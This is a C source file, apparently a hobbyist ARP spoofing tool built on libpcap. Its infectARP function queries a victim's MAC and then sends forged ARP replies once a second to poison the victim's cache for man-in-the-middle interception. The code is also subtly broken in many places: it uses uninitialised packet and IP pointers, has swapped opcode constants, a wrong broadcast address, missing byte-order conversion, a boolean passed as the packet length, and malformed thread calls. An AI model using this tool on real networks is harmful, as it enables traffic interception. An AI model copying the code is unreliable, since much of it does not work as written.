#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <pcap.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
/*
#define REPLY 0x0001
#define REQUEST 0x0002
#define IPSIZE 0x04
#define ARPLEN 28
*/

#define MACLEN 6
#define ARP 0x0806
#define ETHERNET 0x0001
#define IPv4 0x0800
#define ETHERSIZE 0x06
#define IPSIZE 0x04
#define REQUEST 0x0002
#define REPLY 0x0001
#define ETHERNETLEN 14
#define ARPLEN 28


struct ethernet_header{
    uint8_t dest_mac[ETHER_ADDR_LEN];
    uint8_t src_mac[ETHER_ADDR_LEN];
    uint16_t ether_type;
};

struct arp_header{
    uint16_t hw_type;
    uint16_t protocol_type;
    uint8_t hw_size;
    uint8_t protocol_size;
    uint16_t opcode;
    uint8_t send_mac[ETHER_ADDR_LEN];
    uint32_t send_ip;
    uint8_t target_mac[ETHER_ADDR_LEN];
    uint32_t target_ip;
};

struct ip_header{
    uint8_t vhl;
    uint8_t tos;
    uint16_t len;
    uint16_t id;
    uint16_t foffset;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t checksum;
    uint32_t src_ip;
    uint32_t dest_ip;
};

#define IP_HL(ip) ((ip.vhl)&0x0f)

struct tcp_header{
    uint16_t src_port;
    uint16_t dest_port;
    uint32_t seqnum;
    uint32_t acknum;
    uint16_t offset_flag;
    uint16_t windowsize;
    uint16_t checksum;
    uint16_t urgentp;
};

#define TCP_OFF(tcp) (((tcp.offset_flag)&0xf0) >> 4)

uint8_t mymac[ETHER_ADDR_LEN];
uint32_t myip;
uint8_t *device;

void getMyinfo(){
    struct ifreq s;
    struct sockaddr_in *sin;
    int i;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, device);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        for (i = 0; i < ETHER_ADDR_LEN; ++i)
            mymac[i] = s.ifr_addr.sa_data[i];
        printf("OH!\n");

        sin = (struct sockaddr_in*)&s.ifr_addr;
        inet_ntop(AF_INET, &sin->sin_addr.s_addr, myip, sizeof(myip));

        close(fd);

        return;
    }

    close(fd);
    fprintf(stderr, "Socket Error\n");
    exit(2);
}


void *infectARP(void* arg){

    int i;
    char *dev;
    uint8_t *packet;
    uint8_t *res;
    uint32_t packet_length = 0;
    pcap_t *handle;
    struct pcap_pkthdr header;
    char errbuf[PCAP_ERRBUF_SIZE];
    char **argv;
    //int pair_num;

    struct ethernet_header original_ether;
    struct ethernet_header *original_reply;
    struct arp_header original_arp;
    struct ethernet_header attack_ether;
    struct arp_header attack_arp;

    uint16_t reply_ether_type;
    uint8_t sender_mac[MACLEN];
    uint8_t *target_ip;
    uint8_t *sender_ip;
    char *buf;

    argv = (char **)arg;
/*
    pair_num = sizeof(argv)/sizeof(argv[0]) - 1;
    if(pair_num == 1){
        fprintf(stderr, "Argument Error\n");
        return 2;
    }
*/
    dev = argv[1];
    printf("%s", dev);
//    buf = argv[2];
//    inet_pton(AF_INET, &buf, sender_ip);
//    buf = argv[3];
//    inet_pton(AF_INET, &buf, target_ip);
    //printf("%s\n%s\n%s\n", dev, sender_ip, target_ip);

/*
    dev = argv[1];
    gateway_ip = (uint8_t*)malloc(pair_num * sizeof(uint32_t));
    victim_ip = (uint8_t*)malloc(pair_num * sizeof(uint32_t));

    for (i = 1; i <= pair_num; i++){
        buf = argv[2*i];
        inet_pton(AF_INET, &buf, victim_ip[i-1]);
        buf = argv[2*i + 1];
        inet_pton(AF_INET, &buf, gateway_ip[i-1]);
    }
*/
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL){
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return 2;
    }


    getMyinfo();

    for (i = 0; i<MACLEN; i++){
        original_ether.dest_mac[i] = 0xF;
    }
    for (i = 0; i<MACLEN; i++){
        original_ether.src_mac[i] = mymac[i];
    }
    original_ether.ether_type = ARP;

    original_arp.hw_type = ETHERNET;
    original_arp.protocol_type = IPv4;
    original_arp.hw_size = ETHERSIZE;
    original_arp.protocol_size = IPSIZE;
    original_arp.opcode = REQUEST;
    for(i = 0; i<MACLEN; i++){
        original_arp.send_mac[i] = mymac[i];
    }
    original_arp.send_ip = myip;
    for(i = 0; i<MACLEN; i++){
        original_arp.target_mac[i] = 0x0;
    }
    original_arp.target_ip = sender_ip;

    memset(packet, 0, sizeof(packet));
    memcpy(packet, &original_ether, sizeof(original_ether));
    packet_length += sizeof(original_ether);

    memcpy(packet+packet_length, &original_arp, sizeof(original_arp));
    packet_length += sizeof(original_arp);

    if (packet_length < ETHERNETLEN+ARPLEN){
        for(i = packet_length; i<ETHERNETLEN+ARPLEN; i++)
            packet[i] = 0;
    }

    if(pcap_sendpacket(handle, packet, packet_length != 0)){
        fprintf(stderr, "Error sending the packet\n");
        return 2;
    }

    while((res = pcap_next_ex(handle, &header, &packet)) >= 0){

        original_reply = (struct ether_header*)packet;
        reply_ether_type = ntohs(original_reply->ether_type);

        if(reply_ether_type == ARP){
            for (i = 0; i<MACLEN; i++){
                sender_mac[i] = original_reply->src_mac[i];
            }
            break;
        }
    }

    for(i = 0; i<MACLEN; i++){
        attack_ether.dest_mac[i] = mymac[i];
    }
    for(i = 0; i<MACLEN; i++){
        attack_ether.src_mac[i] = sender_mac[i];
    }
    attack_ether.ether_type = ARP;

    attack_arp.hw_type = ETHERNET;
    attack_arp.protocol_type = IPv4;
    attack_arp.hw_size = ETHERSIZE;
    attack_arp.protocol_size = IPSIZE;
    attack_arp.opcode = REPLY;
    for(i = 0; i<MACLEN; i++){
        attack_arp.send_mac[i] = mymac[i];
    }
    attack_arp.send_ip = target_ip;
    for(i=0; i<MACLEN; i++){
        attack_arp.target_mac[i] = sender_mac[i];
    }
    attack_arp.target_ip = sender_ip;

    packet_length = 0;
    memset(packet, 0, sizeof(packet));
    memcpy(packet, &attack_ether, sizeof(attack_ether));
    packet_length += sizeof(attack_ether);

    memcpy(packet+packet_length, &attack_arp, sizeof(attack_arp));
    packet_length += sizeof(attack_arp);

    if (packet_length < ETHERNETLEN+ARPLEN){
        for(i = packet_length; i<ETHERNETLEN+ARPLEN; i++)
            packet[i] = 0;
    }

    while(1){
        printf("**\n");
        if(pcap_sendpacket(handle, packet, packet_length != 0)){
            fprintf(stderr, "Error sending the attack packet\n");
            return 2;
        }
        sleep(1);
    }

    return 0;
}




int main(int argc, char* argv[]){

    pthread_t p_thread[2];
    int tid;
    int result;

    printf("!!\n");
    while(1){
        printf("while\n");
        tid = pthread_create(p_thread[0], NULL, infectARP, (void*)&argv);
        printf("%d", tid);
        if(tid < 0){
            perror("thread create error : ");
            exit(0);
        }
        printf("%d", tid);

        pthread_join(p_thread, (void**)result);
    }

    return 0;
}
